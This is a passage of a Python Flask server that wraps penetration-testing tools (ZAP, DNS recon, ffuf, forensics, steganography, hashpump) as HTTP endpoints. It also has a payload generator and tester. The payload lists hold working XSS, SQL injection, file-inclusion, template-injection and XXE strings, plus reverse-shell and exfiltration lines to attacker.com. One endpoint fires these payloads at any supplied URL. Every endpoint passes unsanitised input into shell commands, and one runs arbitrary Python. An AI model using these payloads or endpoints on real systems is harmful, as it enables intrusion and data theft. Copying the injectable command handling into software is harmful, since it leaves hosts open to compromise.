        if daemon:
            command = f"zaproxy -daemon -host {host} -port {port}"
            if api_key:
                command += f" -config api.key={api_key}"
        else:
            command = f"zaproxy -cmd -quickurl {target}"

            if format_type:
                command += f" -quickout {format_type}"

            if output_file:
                command += f" -quickprogress -dir \"{output_file}\""

            if api_key:
                command += f" -config api.key={api_key}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting ZAP scan: {target}")
        result = execute_command(command)
        logger.info(f"📊 ZAP scan completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in zap endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/wafw00f", methods=["POST"])
def wafw00f():
    """Execute wafw00f to identify and fingerprint WAF products with enhanced logging"""
    try:
        params = request.json
        target = params.get("target", "")
        additional_args = params.get("additional_args", "")

        if not target:
            logger.warning("🛡️ Wafw00f called without target parameter")
            return jsonify({
                "error": "Target parameter is required"
            }), 400

        command = f"wafw00f {target}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🛡️ Starting Wafw00f WAF detection: {target}")
        result = execute_command(command)
        logger.info(f"📊 Wafw00f completed for {target}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in wafw00f endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/fierce", methods=["POST"])
def fierce():
    """Execute fierce for DNS reconnaissance with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        dns_server = params.get("dns_server", "")
        additional_args = params.get("additional_args", "")

        if not domain:
            logger.warning("🌐 Fierce called without domain parameter")
            return jsonify({
                "error": "Domain parameter is required"
            }), 400

        command = f"fierce --domain {domain}"

        if dns_server:
            command += f" --dns-servers {dns_server}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting Fierce DNS recon: {domain}")
        result = execute_command(command)
        logger.info(f"📊 Fierce completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in fierce endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/dnsenum", methods=["POST"])
def dnsenum():
    """Execute dnsenum for DNS enumeration with enhanced logging"""
    try:
        params = request.json
        domain = params.get("domain", "")
        dns_server = params.get("dns_server", "")
        wordlist = params.get("wordlist", "")
        additional_args = params.get("additional_args", "")

        if not domain:
            logger.warning("🌐 DNSenum called without domain parameter")
            return jsonify({
                "error": "Domain parameter is required"
            }), 400

        command = f"dnsenum {domain}"

        if dns_server:
            command += f" --dnsserver {dns_server}"

        if wordlist:
            command += f" --file {wordlist}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔍 Starting DNSenum: {domain}")
        result = execute_command(command)
        logger.info(f"📊 DNSenum completed for {domain}")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in dnsenum endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# Python Environment Management Endpoints
@app.route("/api/python/install", methods=["POST"])
def install_python_package():
    """Install a Python package in a virtual environment"""
    try:
        params = request.json
        package = params.get("package", "")
        env_name = params.get("env_name", "default")

        if not package:
            return jsonify({"error": "Package name is required"}), 400

        logger.info(f"📦 Installing Python package: {package} in env {env_name}")
        success = env_manager.install_package(env_name, package)

        if success:
            return jsonify({
                "success": True,
                "message": f"Package {package} installed successfully",
                "env_name": env_name
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Failed to install package {package}"
            }), 500

    except Exception as e:
        logger.error(f"💥 Error installing Python package: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/python/execute", methods=["POST"])
def execute_python_script():
    """Execute a Python script in a virtual environment"""
    try:
        params = request.json
        script = params.get("script", "")
        env_name = params.get("env_name", "default")
        filename = params.get("filename", f"script_{int(time.time())}.py")

        if not script:
            return jsonify({"error": "Script content is required"}), 400

        # Create script file
        script_result = file_manager.create_file(filename, script)
        if not script_result["success"]:
            return jsonify(script_result), 500

        # Get Python path for environment
        python_path = env_manager.get_python_path(env_name)
        script_path = script_result["path"]

        # Execute script
        command = f"{python_path} {script_path}"
        logger.info(f"🐍 Executing Python script in env {env_name}: {filename}")
        result = execute_command(command, use_cache=False)

        # Clean up script file
        file_manager.delete_file(filename)

        result["env_name"] = env_name
        result["script_filename"] = filename
        logger.info(f"📊 Python script execution completed")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error executing Python script: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ============================================================================
# AI-POWERED PAYLOAD GENERATION (v5.0 ENHANCEMENT) UNDER DEVELOPMENT
# ============================================================================

class AIPayloadGenerator:
    """AI-powered payload generation system with contextual intelligence"""

    def __init__(self):
        self.payload_templates = {
            "xss": {
                "basic": ["<script>alert('XSS')</script>", "javascript:alert('XSS')", "'><script>alert('XSS')</script>"],
                "advanced": [
                    "<img src=x onerror=alert('XSS')>",
                    "<svg onload=alert('XSS')>",
                    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
                    "\"><script>alert('XSS')</script><!--",
                    "<iframe src=\"javascript:alert('XSS')\">",
                    "<body onload=alert('XSS')>"
                ],
                "bypass": [
                    "<ScRiPt>alert('XSS')</ScRiPt>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "<img src=\"javascript:alert('XSS')\">",
                    "<svg/onload=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<details ontoggle=alert('XSS')>"
                ]
            },
            "sqli": {
                "basic": ["' OR '1'='1", "' OR 1=1--", "admin'--", "' UNION SELECT NULL--"],
                "advanced": [
                    "' UNION SELECT 1,2,3,4,5--",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "' AND (SELECT SUBSTRING(@@version,1,10))='Microsoft'--",
                    "'; EXEC xp_cmdshell('whoami')--",
                    "' OR 1=1 LIMIT 1--",
                    "' AND 1=(SELECT COUNT(*) FROM tablenames)--"
                ],
                "time_based": [
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' OR (SELECT SLEEP(5))--",
                    "'; SELECT pg_sleep(5)--",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
                ]
            },
            "lfi": {
                "basic": ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
                "advanced": [
                    "....//....//....//etc/passwd",
                    "..%2F..%2F..%2Fetc%2Fpasswd",
                    "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
                    "/var/log/apache2/access.log",
                    "/proc/self/environ",
                    "/etc/passwd%00"
                ]
            },
            "cmd_injection": {
                "basic": ["; whoami", "| whoami", "& whoami", "`whoami`"],
                "advanced": [
                    "; cat /etc/passwd",
                    "| nc -e /bin/bash attacker.com 4444",
                    "&& curl http://attacker.com/$(whoami)",
                    "`curl http://attacker.com/$(id)`"
                ]
            },
            "xxe": {
                "basic": [
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>"
                ]
            },
            "ssti": {
                "basic": ["{{7*7}}", "${7*7}", "#{7*7}", "<%=7*7%>"],
                "advanced": [
                    "{{config}}",
                    "{{''.__class__.__mro__[2].__subclasses__()}}",
                    "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}"
                ]
            }
        }

    def generate_contextual_payload(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate contextual payloads based on target information"""

        attack_type = target_info.get("attack_type", "xss")
        complexity = target_info.get("complexity", "basic")
        target_tech = target_info.get("technology", "").lower()

        # Get base payloads
        payloads = self._get_payloads(attack_type, complexity)

        # Enhance payloads with context
        enhanced_payloads = self._enhance_with_context(payloads, target_tech)

        # Generate test cases
        test_cases = self._generate_test_cases(enhanced_payloads, attack_type)

        return {
            "attack_type": attack_type,
            "complexity": complexity,
            "payload_count": len(enhanced_payloads),
            "payloads": enhanced_payloads,
            "test_cases": test_cases,
            "recommendations": self._get_recommendations(attack_type)
        }

    def _get_payloads(self, attack_type: str, complexity: str) -> list:
        """Get payloads for specific attack type and complexity"""
        if attack_type in self.payload_templates:
            if complexity in self.payload_templates[attack_type]:
                return self.payload_templates[attack_type][complexity]
            else:
                # Return basic payloads if complexity not found
                return self.payload_templates[attack_type].get("basic", [])

        return ["<!-- No payloads available for this attack type -->"]

    def _enhance_with_context(self, payloads: list, tech_context: str) -> list:
        """Enhance payloads with contextual information"""
        enhanced = []

        for payload in payloads:
            # Basic payload
            enhanced.append({
                "payload": payload,
                "context": "basic",
                "encoding": "none",
                "risk_level": self._assess_risk_level(payload)
            })

            # URL encoded version
            url_encoded = payload.replace(" ", "%20").replace("<", "%3C").replace(">", "%3E")
            enhanced.append({
                "payload": url_encoded,
                "context": "url_encoded",
                "encoding": "url",
                "risk_level": self._assess_risk_level(payload)
            })

        return enhanced

    def _generate_test_cases(self, payloads: list, attack_type: str) -> list:
        """Generate test cases for the payloads"""
        test_cases = []

        for i, payload_info in enumerate(payloads[:5]):  # Limit to 5 test cases
            test_case = {
                "id": f"test_{i+1}",
                "payload": payload_info["payload"],
                "method": "GET" if len(payload_info["payload"]) < 100 else "POST",
                "expected_behavior": self._get_expected_behavior(attack_type),
                "risk_level": payload_info["risk_level"]
            }
            test_cases.append(test_case)

        return test_cases

    def _get_expected_behavior(self, attack_type: str) -> str:
        """Get expected behavior for attack type"""
        behaviors = {
            "xss": "JavaScript execution or popup alert",
            "sqli": "Database error or data extraction",
            "lfi": "File content disclosure",
            "cmd_injection": "Command execution on server",
            "ssti": "Template expression evaluation",
            "xxe": "XML external entity processing"
        }
        return behaviors.get(attack_type, "Unexpected application behavior")

    def _assess_risk_level(self, payload: str) -> str:
        """Assess risk level of payload"""
        high_risk_indicators = ["system", "exec", "eval", "cmd", "shell", "passwd", "etc"]
        medium_risk_indicators = ["script", "alert", "union", "select"]

        payload_lower = payload.lower()

        if any(indicator in payload_lower for indicator in high_risk_indicators):
            return "HIGH"
        elif any(indicator in payload_lower for indicator in medium_risk_indicators):
            return "MEDIUM"
        else:
            return "LOW"

    def _get_recommendations(self, attack_type: str) -> list:
        """Get testing recommendations"""
        recommendations = {
            "xss": [
                "Test in different input fields and parameters",
                "Try both reflected and stored XSS scenarios",
                "Test with different browsers for compatibility"
            ],
            "sqli": [
                "Test different SQL injection techniques",
                "Try both error-based and blind injection",
                "Test various database-specific payloads"
            ],
            "lfi": [
                "Test various directory traversal depths",
                "Try different encoding techniques",
                "Test for log file inclusion"
            ],
            "cmd_injection": [
                "Test different command separators",
                "Try both direct and blind injection",
                "Test with various payloads for different OS"
            ]
        }

        return recommendations.get(attack_type, ["Test thoroughly", "Monitor responses"])

# Global AI payload generator
ai_payload_generator = AIPayloadGenerator()

@app.route("/api/ai/generate_payload", methods=["POST"])
def ai_generate_payload():
    """Generate AI-powered contextual payloads for security testing"""
    try:
        params = request.json
        target_info = {
            "attack_type": params.get("attack_type", "xss"),
            "complexity": params.get("complexity", "basic"),
            "technology": params.get("technology", ""),
            "url": params.get("url", "")
        }

        logger.info(f"🤖 Generating AI payloads for {target_info['attack_type']} attack")
        result = ai_payload_generator.generate_contextual_payload(target_info)

        logger.info(f"✅ Generated {result['payload_count']} contextual payloads")

        return jsonify({
            "success": True,
            "ai_payload_generation": result,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in AI payload generation: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/ai/test_payload", methods=["POST"])
def ai_test_payload():
    """Test generated payload against target with AI analysis"""
    try:
        params = request.json
        payload = params.get("payload", "")
        target_url = params.get("target_url", "")
        method = params.get("method", "GET")

        if not payload or not target_url:
            return jsonify({
                "success": False,
                "error": "Payload and target_url are required"
            }), 400

        logger.info(f"🧪 Testing AI-generated payload against {target_url}")

        # Create test command based on method and payload
        if method.upper() == "GET":
            encoded_payload = payload.replace(" ", "%20").replace("'", "%27")
            test_command = f"curl -s '{target_url}?test={encoded_payload}'"
        else:
            test_command = f"curl -s -X POST -d 'test={payload}' '{target_url}'"

        # Execute test
        result = execute_command(test_command, use_cache=False)

        # AI analysis of results
        analysis = {
            "payload_tested": payload,
            "target_url": target_url,
            "method": method,
            "response_size": len(result.get("stdout", "")),
            "success": result.get("success", False),
            "potential_vulnerability": payload.lower() in result.get("stdout", "").lower(),
            "recommendations": [
                "Analyze response for payload reflection",
                "Check for error messages indicating vulnerability",
                "Monitor application behavior changes"
            ]
        }

        logger.info(f"🔍 Payload test completed | Potential vuln: {analysis['potential_vulnerability']}")

        return jsonify({
            "success": True,
            "test_result": result,
            "ai_analysis": analysis,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in AI payload testing: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ADVANCED API TESTING TOOLS (v5.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/tools/api_fuzzer", methods=["POST"])
def api_fuzzer():
    """Advanced API endpoint fuzzing with intelligent parameter discovery"""
    try:
        params = request.json
        base_url = params.get("base_url", "")
        endpoints = params.get("endpoints", [])
        methods = params.get("methods", ["GET", "POST", "PUT", "DELETE"])
        wordlist = params.get("wordlist", "/usr/share/wordlists/api/api-endpoints.txt")

        if not base_url:
            logger.warning("🌐 API Fuzzer called without base_url parameter")
            return jsonify({
                "error": "Base URL parameter is required"
            }), 400

        # Create comprehensive API fuzzing command
        if endpoints:
            # Test specific endpoints
            results = []
            for endpoint in endpoints:
                for method in methods:
                    test_url = f"{base_url.rstrip('/')}/{endpoint.lstrip('/')}"
                    command = f"curl -s -X {method} -w '%{{http_code}}|%{{size_download}}' '{test_url}'"
                    result = execute_command(command, use_cache=False)
                    results.append({
                        "endpoint": endpoint,
                        "method": method,
                        "result": result
                    })

            logger.info(f"🔍 API endpoint testing completed for {len(endpoints)} endpoints")
            return jsonify({
                "success": True,
                "fuzzing_type": "endpoint_testing",
                "results": results
            })
        else:
            # Discover endpoints using wordlist
            command = f"ffuf -u {base_url}/FUZZ -w {wordlist} -mc 200,201,202,204,301,302,307,401,403,405 -t 50"

            logger.info(f"🔍 Starting API endpoint discovery: {base_url}")
            result = execute_command(command)
            logger.info(f"📊 API endpoint discovery completed")

            return jsonify({
                "success": True,
                "fuzzing_type": "endpoint_discovery",
                "result": result
            })

    except Exception as e:
        logger.error(f"💥 Error in API fuzzer: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/graphql_scanner", methods=["POST"])
def graphql_scanner():
    """Advanced GraphQL security scanning and introspection"""
    try:
        params = request.json
        endpoint = params.get("endpoint", "")
        introspection = params.get("introspection", True)
        query_depth = params.get("query_depth", 10)
        mutations = params.get("test_mutations", True)

        if not endpoint:
            logger.warning("🌐 GraphQL Scanner called without endpoint parameter")
            return jsonify({
                "error": "GraphQL endpoint parameter is required"
            }), 400

        logger.info(f"🔍 Starting GraphQL security scan: {endpoint}")

        results = {
            "endpoint": endpoint,
            "tests_performed": [],
            "vulnerabilities": [],
            "recommendations": []
        }

        # Test 1: Introspection query
        if introspection:
            introspection_query = '''
            {
                __schema {
                    types {
                        name
                        fields {
                            name
                            type {
                                name
                            }
                        }
                    }
                }
            }
            '''

            clean_query = introspection_query.replace('\n', ' ').replace('  ', ' ').strip()
            command = f"curl -s -X POST -H 'Content-Type: application/json' -d '{{\"query\":\"{clean_query}\"}}' '{endpoint}'"
            result = execute_command(command, use_cache=False)

            results["tests_performed"].append("introspection_query")

            if "data" in result.get("stdout", ""):
                results["vulnerabilities"].append({
                    "type": "introspection_enabled",
                    "severity": "MEDIUM",
                    "description": "GraphQL introspection is enabled"
                })

        # Test 2: Query depth analysis
        deep_query = "{ " * query_depth + "field" + " }" * query_depth
        command = f"curl -s -X POST -H 'Content-Type: application/json' -d '{{\"query\":\"{deep_query}\"}}' {endpoint}"
        depth_result = execute_command(command, use_cache=False)

        results["tests_performed"].append("query_depth_analysis")

        if "error" not in depth_result.get("stdout", "").lower():
            results["vulnerabilities"].append({
                "type": "no_query_depth_limit",
                "severity": "HIGH",
                "description": f"No query depth limiting detected (tested depth: {query_depth})"
            })

        # Test 3: Batch query testing
        batch_query = '[' + ','.join(['{\"query\":\"{field}\"}' for _ in range(10)]) + ']'
        command = f"curl -s -X POST -H 'Content-Type: application/json' -d '{batch_query}' {endpoint}"
        batch_result = execute_command(command, use_cache=False)

        results["tests_performed"].append("batch_query_testing")

        if "data" in batch_result.get("stdout", "") and batch_result.get("success"):
            results["vulnerabilities"].append({
                "type": "batch_queries_allowed",
                "severity": "MEDIUM",
                "description": "Batch queries are allowed without rate limiting"
            })

        # Generate recommendations
        if results["vulnerabilities"]:
            results["recommendations"] = [
                "Disable introspection in production",
                "Implement query depth limiting",
                "Add rate limiting for batch queries",
                "Implement query complexity analysis",
                "Add authentication for sensitive operations"
            ]

        logger.info(f"📊 GraphQL scan completed | Vulnerabilities found: {len(results['vulnerabilities'])}")

        return jsonify({
            "success": True,
            "graphql_scan_results": results
        })

    except Exception as e:
        logger.error(f"💥 Error in GraphQL scanner: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/jwt_analyzer", methods=["POST"])
def jwt_analyzer():
    """Advanced JWT token analysis and vulnerability testing"""
    try:
        params = request.json
        jwt_token = params.get("jwt_token", "")
        target_url = params.get("target_url", "")

        if not jwt_token:
            logger.warning("🔐 JWT Analyzer called without jwt_token parameter")
            return jsonify({
                "error": "JWT token parameter is required"
            }), 400

        logger.info(f"🔍 Starting JWT security analysis")

        results = {
            "token": jwt_token[:50] + "..." if len(jwt_token) > 50 else jwt_token,
            "vulnerabilities": [],
            "token_info": {},
            "attack_vectors": []
        }

        # Decode JWT header and payload (basic analysis)
        try:
            parts = jwt_token.split('.')
            if len(parts) >= 2:
                # Decode header
                import base64
                import json

                # Add padding if needed
                header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
                payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)

                try:
                    header = json.loads(base64.b64decode(header_b64))
                    payload = json.loads(base64.b64decode(payload_b64))

                    results["token_info"] = {
                        "header": header,
                        "payload": payload,
                        "algorithm": header.get("alg", "unknown")
                    }

                    # Check for vulnerabilities
                    algorithm = header.get("alg", "").lower()

                    if algorithm == "none":
                        results["vulnerabilities"].append({
                            "type": "none_algorithm",
                            "severity": "CRITICAL",
                            "description": "JWT uses 'none' algorithm - no signature verification"
                        })

                    if algorithm in ["hs256", "hs384", "hs512"]:
                        results["attack_vectors"].append("hmac_key_confusion")
                        results["vulnerabilities"].append({
                            "type": "hmac_algorithm",
                            "severity": "MEDIUM",
                            "description": "HMAC algorithm detected - vulnerable to key confusion attacks"
                        })

                    # Check token expiration
                    exp = payload.get("exp")
                    if not exp:
                        results["vulnerabilities"].append({
                            "type": "no_expiration",
                            "severity": "HIGH",
                            "description": "JWT token has no expiration time"
                        })

                except Exception as decode_error:
                    results["vulnerabilities"].append({
                        "type": "malformed_token",
                        "severity": "HIGH",
                        "description": f"Token decoding failed: {str(decode_error)}"
                    })

        except Exception as e:
            results["vulnerabilities"].append({
                "type": "invalid_format",
                "severity": "HIGH",
                "description": "Invalid JWT token format"
            })

        # Test token manipulation if target URL provided
        if target_url:
            # Test none algorithm attack
            none_token_parts = jwt_token.split('.')
            if len(none_token_parts) >= 2:
                # Create none algorithm token
                none_header = base64.b64encode('{"alg":"none","typ":"JWT"}'.encode()).decode().rstrip('=')
                none_token = f"{none_header}.{none_token_parts[1]}."

                command = f"curl -s -H 'Authorization: Bearer {none_token}' '{target_url}'"
                none_result = execute_command(command, use_cache=False)

                if "200" in none_result.get("stdout", "") or "success" in none_result.get("stdout", "").lower():
                    results["vulnerabilities"].append({
                        "type": "none_algorithm_accepted",
                        "severity": "CRITICAL",
                        "description": "Server accepts tokens with 'none' algorithm"
                    })

        logger.info(f"📊 JWT analysis completed | Vulnerabilities found: {len(results['vulnerabilities'])}")

        return jsonify({
            "success": True,
            "jwt_analysis_results": results
        })

    except Exception as e:
        logger.error(f"💥 Error in JWT analyzer: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/api_schema_analyzer", methods=["POST"])
def api_schema_analyzer():
    """Analyze API schemas and identify potential security issues"""
    try:
        params = request.json
        schema_url = params.get("schema_url", "")
        schema_type = params.get("schema_type", "openapi")  # openapi, swagger, graphql

        if not schema_url:
            logger.warning("📋 API Schema Analyzer called without schema_url parameter")
            return jsonify({
                "error": "Schema URL parameter is required"
            }), 400

        logger.info(f"🔍 Starting API schema analysis: {schema_url}")

        # Fetch schema
        command = f"curl -s '{schema_url}'"
        result = execute_command(command, use_cache=True)

        if not result.get("success"):
            return jsonify({
                "error": "Failed to fetch API schema"
            }), 400

        schema_content = result.get("stdout", "")

        analysis_results = {
            "schema_url": schema_url,
            "schema_type": schema_type,
            "endpoints_found": [],
            "security_issues": [],
            "recommendations": []
        }

        # Parse schema based on type
        try:
            import json
            schema_data = json.loads(schema_content)

            if schema_type.lower() in ["openapi", "swagger"]:
                # OpenAPI/Swagger analysis
                paths = schema_data.get("paths", {})

                for path, methods in paths.items():
                    for method, details in methods.items():
                        if isinstance(details, dict):
                            endpoint_info = {
                                "path": path,
                                "method": method.upper(),
                                "summary": details.get("summary", ""),
                                "parameters": details.get("parameters", []),
                                "security": details.get("security", [])
                            }
                            analysis_results["endpoints_found"].append(endpoint_info)

                            # Check for security issues
                            if not endpoint_info["security"]:
                                analysis_results["security_issues"].append({
                                    "endpoint": f"{method.upper()} {path}",
                                    "issue": "no_authentication",
                                    "severity": "MEDIUM",
                                    "description": "Endpoint has no authentication requirements"
                                })

                            # Check for sensitive data in parameters
                            for param in endpoint_info["parameters"]:
                                param_name = param.get("name", "").lower()
                                if any(sensitive in param_name for sensitive in ["password", "token", "key", "secret"]):
                                    analysis_results["security_issues"].append({
                                        "endpoint": f"{method.upper()} {path}",
                                        "issue": "sensitive_parameter",
                                        "severity": "HIGH",
                                        "description": f"Sensitive parameter detected: {param_name}"
                                    })

            # Generate recommendations
            if analysis_results["security_issues"]:
                analysis_results["recommendations"] = [
                    "Implement authentication for all endpoints",
                    "Use HTTPS for all API communications",
                    "Validate and sanitize all input parameters",
                    "Implement rate limiting",
                    "Add proper error handling",
                    "Use secure headers (CORS, CSP, etc.)"
                ]

        except json.JSONDecodeError:
            analysis_results["security_issues"].append({
                "endpoint": "schema",
                "issue": "invalid_json",
                "severity": "HIGH",
                "description": "Schema is not valid JSON"
            })

        logger.info(f"📊 Schema analysis completed | Issues found: {len(analysis_results['security_issues'])}")

        return jsonify({
            "success": True,
            "schema_analysis_results": analysis_results
        })

    except Exception as e:
        logger.error(f"💥 Error in API schema analyzer: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ADVANCED CTF TOOLS (v5.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/tools/volatility3", methods=["POST"])
def volatility3():
    """Execute Volatility3 for advanced memory forensics with enhanced logging"""
    try:
        params = request.json
        memory_file = params.get("memory_file", "")
        plugin = params.get("plugin", "")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")

        if not memory_file:
            logger.warning("🧠 Volatility3 called without memory_file parameter")
            return jsonify({
                "error": "Memory file parameter is required"
            }), 400

        if not plugin:
            logger.warning("🧠 Volatility3 called without plugin parameter")
            return jsonify({
                "error": "Plugin parameter is required"
            }), 400

        command = f"vol.py -f {memory_file} {plugin}"

        if output_file:
            command += f" -o {output_file}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🧠 Starting Volatility3 analysis: {plugin}")
        result = execute_command(command)
        logger.info(f"📊 Volatility3 analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in volatility3 endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/foremost", methods=["POST"])
def foremost():
    """Execute Foremost for file carving with enhanced logging"""
    try:
        params = request.json
        input_file = params.get("input_file", "")
        output_dir = params.get("output_dir", "/tmp/foremost_output")
        file_types = params.get("file_types", "")
        additional_args = params.get("additional_args", "")

        if not input_file:
            logger.warning("📁 Foremost called without input_file parameter")
            return jsonify({
                "error": "Input file parameter is required"
            }), 400

        # Ensure output directory exists
        Path(output_dir).mkdir(parents=True, exist_ok=True)

        command = f"foremost -o {output_dir}"

        if file_types:
            command += f" -t {file_types}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {input_file}"

        logger.info(f"📁 Starting Foremost file carving: {input_file}")
        result = execute_command(command)
        result["output_directory"] = output_dir
        logger.info(f"📊 Foremost carving completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in foremost endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/steghide", methods=["POST"])
def steghide():
    """Execute Steghide for steganography analysis with enhanced logging"""
    try:
        params = request.json
        action = params.get("action", "extract")  # extract, embed, info
        cover_file = params.get("cover_file", "")
        embed_file = params.get("embed_file", "")
        passphrase = params.get("passphrase", "")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")

        if not cover_file:
            logger.warning("🖼️ Steghide called without cover_file parameter")
            return jsonify({
                "error": "Cover file parameter is required"
            }), 400

        if action == "extract":
            command = f"steghide extract -sf {cover_file}"
            if output_file:
                command += f" -xf {output_file}"
        elif action == "embed":
            if not embed_file:
                return jsonify({"error": "Embed file required for embed action"}), 400
            command = f"steghide embed -cf {cover_file} -ef {embed_file}"
        elif action == "info":
            command = f"steghide info {cover_file}"
        else:
            return jsonify({"error": "Invalid action. Use: extract, embed, info"}), 400

        if passphrase:
            command += f" -p {passphrase}"
        else:
            command += " -p ''"  # Empty passphrase

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🖼️ Starting Steghide {action}: {cover_file}")
        result = execute_command(command)
        logger.info(f"📊 Steghide {action} completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in steghide endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/exiftool", methods=["POST"])
def exiftool():
    """Execute ExifTool for metadata extraction with enhanced logging"""
    try:
        params = request.json
        file_path = params.get("file_path", "")
        output_format = params.get("output_format", "")  # json, xml, csv
        tags = params.get("tags", "")
        additional_args = params.get("additional_args", "")

        if not file_path:
            logger.warning("📷 ExifTool called without file_path parameter")
            return jsonify({
                "error": "File path parameter is required"
            }), 400

        command = f"exiftool"

        if output_format:
            command += f" -{output_format}"

        if tags:
            command += f" -{tags}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {file_path}"

        logger.info(f"📷 Starting ExifTool analysis: {file_path}")
        result = execute_command(command)
        logger.info(f"📊 ExifTool analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in exiftool endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/hashpump", methods=["POST"])
def hashpump():
    """Execute HashPump for hash length extension attacks with enhanced logging"""
    try:
        params = request.json
        signature = params.get("signature", "")
        data = params.get("data", "")
        key_length = params.get("key_length", "")
        append_data = params.get("append_data", "")
        additional_args = params.get("additional_args", "")

        if not all([signature, data, key_length, append_data]):
            logger.warning("🔐 HashPump called without required parameters")
            return jsonify({
                "error": "Signature, data, key_length, and append_data parameters are required"
            }), 400

        command = f"hashpump -s {signature} -d '{data}' -k {key_length} -a '{append_data}'"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔐 Starting HashPump attack")
        result = execute_command(command)
        logger.info(f"📊 HashPump attack completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in hashpump endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# BUG BOUNTY RECONNAISSANCE TOOLS (v5.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/tools/hakrawler", methods=["POST"])
def hakrawler():
    """
    Execute Hakrawler for web endpoint discovery with enhanced logging

    Note: This implementation uses the standard Kali Linux hakrawler (hakluke/hakrawler)
    command line arguments, NOT the Elsfa7-110 fork. The standard version uses:
    - echo URL | hakrawler (stdin input)
    - -d for depth (not -depth)
    - -s for showing sources (not -forms)
    - -u for unique URLs
    - -subs for subdomain inclusion
    """
    try:
        params = request.json
        url = params.get("url", "")
        depth = params.get("depth", 2)
        forms = params.get("forms", True)
        robots = params.get("robots", True)
        sitemap = params.get("sitemap", True)
        wayback = params.get("wayback", False)
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🕷️ Hakrawler called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        # Build command for standard Kali Linux hakrawler (hakluke version)
        command = f"echo '{url}' | hakrawler -d {depth}"

        if forms:
            command += " -s"  # Show sources (includes forms)
        if robots or sitemap or wayback:
            command += " -subs"  # Include subdomains for better coverage

        # Add unique URLs flag for cleaner output
        command += " -u"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🕷️ Starting Hakrawler crawling: {url}")
        result = execute_command(command)
        logger.info(f"📊 Hakrawler crawling completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in hakrawler endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
